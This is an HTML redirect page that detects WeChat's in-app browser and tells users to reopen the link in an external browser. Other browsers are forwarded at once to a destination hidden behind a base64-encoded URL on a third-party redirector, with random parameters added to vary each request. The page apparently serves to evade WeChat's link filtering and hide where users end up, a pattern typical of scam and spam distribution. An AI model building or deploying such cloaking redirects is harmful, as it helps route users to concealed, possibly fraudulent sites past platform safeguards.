<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <!-- 强制禁用缓存 -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>微信浏览器引导跳转</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
        }
        
        /* 微信引导页面样式 */
        .weixin-guide {
            display: none;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 20px;
            height: 100vh;
            box-sizing: border-box;
        }
        
        .guide-image {
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }
        
        .guide-text {
            margin-top: 20px;
            color: #666;
            font-size: 16px;
        }
        
        /* 加载提示 */
        .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
        }
    </style>
</head>
<body>
    <!-- 微信引导页面 -->
    <div id="weixinGuide" class="weixin-guide">
        <img src="/guide-top.png" alt="第一步：点击右上角三个点" class="guide-image">
        <img src="/guide-bottom.png" alt="第二步：选择在浏览器中打开" class="guide-image">
        <p class="guide-text">请点击右上角 <span style="font-size: 1.2em;">···</span> 选择"在浏览器中打开"</p>
    </div>
    
    <!-- 加载提示 -->
    <div id="loading" class="loading">
        页面加载中...
    </div>
    
    <script>
        // 检测是否在微信内置浏览器中
        function isWeixinBrowser() {
            return /MicroMessenger/i.test(navigator.userAgent);
        }
        
        // 生成高强度随机字符串
        function generateStrongRandom() {
            return crypto.getRandomValues(new Uint32Array(1))[0].toString(36) + 
                   Date.now().toString(36) +
                   Math.random().toString(36).substr(2, 9);
        }
        
        // 获取当前URL带随机参数（微信专用）
        function getWeixinRedirectUrl() {
            const baseUrl = window.location.href.split('?')[0].split('#')[0];
            const randomParam = "wxrnd=" + generateStrongRandom();
            return baseUrl + (baseUrl.includes('?') ? '&' : '?') + randomParam;
        }
        
        // 获取目标URL带随机参数
        function getTargetUrl() {
            const baseUrl = "http://laicai.66ghz.com/c.htm?c=aHR0cDovL3h6enouaHVpc2hpLm5hbWUvc2FmZS9pbmRleD9pZD0xNjE="; // 请替换为实际地址
            const randomParam = "t=" + generateStrongRandom();
            return baseUrl + (baseUrl.includes('?') ? '&' : '?') + randomParam;
        }
        
        // 处理微信内跳转逻辑
        function handleWeixinFlow() {
            const currentUrl = window.location.href;
            
            // 如果URL中不包含wxrnd参数，说明是首次加载
            if (!currentUrl.includes('wxrnd=')) {
                // 显示加载提示
                document.getElementById('loading').style.display = 'block';
                
                // 跳转到带随机参数的当前URL（强制刷新）
                setTimeout(() => {
                    window.location.href = getWeixinRedirectUrl();
                }, 100);
            } 
            // 如果已包含wxrnd参数，显示引导页
            else {
                document.getElementById('weixinGuide').style.display = 'flex';
                
                // 添加点击提示
                document.body.addEventListener('click', () => {
                    alert('请点击右上角···菜单，选择"在浏览器中打开"');
                });
            }
        }
        
        // 页面加载主逻辑
        window.onload = function() {
            if (isWeixinBrowser()) {
                handleWeixinFlow();
            } else {
                // 外部浏览器直接跳转到目标页（带随机参数）
                window.location.href = getTargetUrl();
            }
        };
    </script>
</body>
</html>
